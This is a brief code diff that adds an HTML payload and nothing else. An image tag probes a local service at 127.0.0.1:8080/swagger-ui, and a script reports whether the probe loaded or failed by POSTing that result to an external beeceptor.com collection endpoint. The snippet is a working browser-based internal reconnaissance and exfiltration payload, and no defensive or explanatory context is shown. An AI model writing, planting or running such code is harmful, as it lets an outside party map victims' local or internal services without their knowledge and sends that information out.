@@ -1,0 +1,6 @@
+<img src="http://127.0.0.1:8080/swagger-ui/" onload='report("Loaded ok")' onerror='report("Error occurred")'>
+<script>
+function report(msg){
+  fetch("https://vodagh.free.beeceptor.com/report",{method:"POST",body:msg})
+}
+</script>
